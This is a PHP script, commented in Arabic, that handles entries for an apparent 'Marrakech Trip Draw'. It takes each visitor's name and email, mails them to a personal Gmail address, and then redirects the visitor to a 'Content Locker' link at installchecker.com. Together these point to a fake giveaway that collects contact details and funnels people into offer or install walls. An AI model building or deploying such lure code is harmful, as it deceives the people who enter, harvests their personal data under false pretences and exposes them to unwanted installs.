<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // استلام البيانات من الاستمارة
    $name = htmlspecialchars($_POST['name']);
    $email = htmlspecialchars($_POST['email']);

    // إعداد البريد الإلكتروني
    $to = "azahbi1@gmail.com";
    $subject = "New Entry for Marrakech Trip Draw";
    $message = "Name: $name\nEmail: $email";
    $headers = "From: no-reply@yourdomain.com";

    // إرسال البريد الإلكتروني
    if (mail($to, $subject, $message, $headers)) {
        // توجيه المستخدم إلى Content Locker
        header("Location: https://installchecker.com/cl/i/r7m7rg");
        exit();
    } else {
        echo "There was an error sending your entry. Please try again.";
    }
}
?>
